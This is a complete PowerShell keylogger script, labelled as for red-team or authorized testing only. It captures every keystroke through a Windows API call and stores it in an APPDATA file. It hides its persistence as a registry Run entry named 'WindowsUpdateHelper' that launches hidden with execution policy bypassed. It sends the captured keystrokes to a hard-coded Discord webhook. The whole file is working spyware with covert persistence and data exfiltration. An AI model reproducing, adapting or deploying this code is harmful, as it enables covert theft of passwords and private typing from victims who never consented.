# PowerShell Keylogger with Persistence & Discord Webhook Exfiltration
# Educational / Red Team / Authorized Testing Only
# DO NOT use on systems you do not own or have explicit permission to test

$webhookUrl = "https://discord.com/api/webhooks/1449205881085366413/UAZTDi3qQJDnJxf3ODpODtY9_wyoI7oC0IF5mLwsMWwLieGF9XJMc7E7hpP7Z_TxcGsh"

$logPath = "$env:APPDATA\Microsoft\Windows\keylog.txt"
$sendPath   = "$env:APPDATA\Microsoft\Windows\mylog-send.txt"

$maxTime = 3  # Seconds
$sw = [System.Diagnostics.Stopwatch]::StartNew()

# Empty file if it exists, else create it
"" | Out-File -FilePath $logPath -Encoding utf8 -Force

# Load assembly for key detection
Add-Type -AssemblyName System.Windows.Forms

$signatures = @'
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
'@
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

# Discord webhook sending function
function Send-ToDiscord {
    param([string]$content)
    if ([string]::IsNullOrWhiteSpace($content)) { return }

    $payload = @{ content = $content } | ConvertTo-Json -Compress
    try {
        Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -UseBasicParsing -TimeoutSec 10 | Out-Null
    } catch {
        Write-Host "Send error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Persistence function
function Set-Persistence {
    $currentScriptPath = $MyInvocation.MyCommand.Path
    if (-not $currentScriptPath) {
        $currentScriptPath = "$env:APPDATA\Microsoft\Windows\start.ps1"
        $MyInvocation.MyCommand.Definition | Out-File -FilePath $currentScriptPath -Encoding utf8 -Force
    }
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $value   = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$currentScriptPath`""
    Set-ItemProperty -Path $regPath -Name "WindowsUpdateHelper" -Value $value -Force
}

# Add persistence if not already present
if (-not (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdateHelper" -ErrorAction SilentlyContinue)) {
    Set-Persistence
}

# Main keylogging loop
while ($true) {
    Start-Sleep -Milliseconds 40
    $logged = ""
    for ($key = 8; $key -le 222; $key++) {
        $state = $API::GetAsyncKeyState($key)
        if ($state -eq -32767) {
            switch ($key) {
                8  { $logged += "[BACKSPACE]" }
                9  { $logged += "[TAB]" }
                13 { $logged += "[ENTER]`n" }
                16 { $logged += "[SHIFT]" }
                17 { $logged += "[CTRL]" }
                18 { $logged += "[ALT]" }
                20 { $logged += "[CAPSLOCK]" }
                27 { $logged += "[ESC]" }
                32 { $logged += " " }
                37 { $logged += "[LEFT]" }
                38 { $logged += "[UP]" }
                39 { $logged += "[RIGHT]" }
                40 { $logged += "[DOWN]" }
                46 { $logged += "[DELETE]" }
                {$_ -ge 65 -and $_ -le 90} {  # A-Z
                    if ([System.Windows.Forms.Control]::ModifierKeys -band [System.Windows.Forms.Keys]::Shift) {
                        $logged += [char]$key
                    } else {
                        $logged += [char]($key + 32)
                    }
                }
                {$_ -ge 48 -and $_ -le 57} { $logged += [char]$key }  # 0-9
                {$_ -ge 96 -and $_ -le 105} { $logged += [char]($key - 48) }  # Numpad
                default { $logged += [char]$key }
            }
        }
    }

    if ($logged) {
        Add-Content -Path $logPath -Value $logged -Encoding utf8
        $sw.Restart()
    }

    $timeElapsed = $sw.Elapsed.TotalSeconds

    # Send to Discord when typing has been idle for specified time
	if ($timeElapsed -ge $maxTime -and -not [string]::IsNullOrWhiteSpace((Get-Content $logPath -Raw))) {
        
    	Move-Item -Path $logPath -Destination $sendPath -Force

        "" | Out-File -FilePath $logPath -Encoding UTF8

        $content = Get-Content -Path $sendPath -Raw -ErrorAction SilentlyContinue

        $cleanContent = ($content -replace "`r","" -replace "`n","").Trim()

        Send-ToDiscord ("[$(Get-Date -Format 'HH:mm:ss')] " + $cleanContent)
        Remove-Item -Path $sendPath -Force -ErrorAction SilentlyContinue
	}

    if ($timeElapsed -ge $maxTime) {
        $sw.Restart()
    }
}

Start-KeyLogger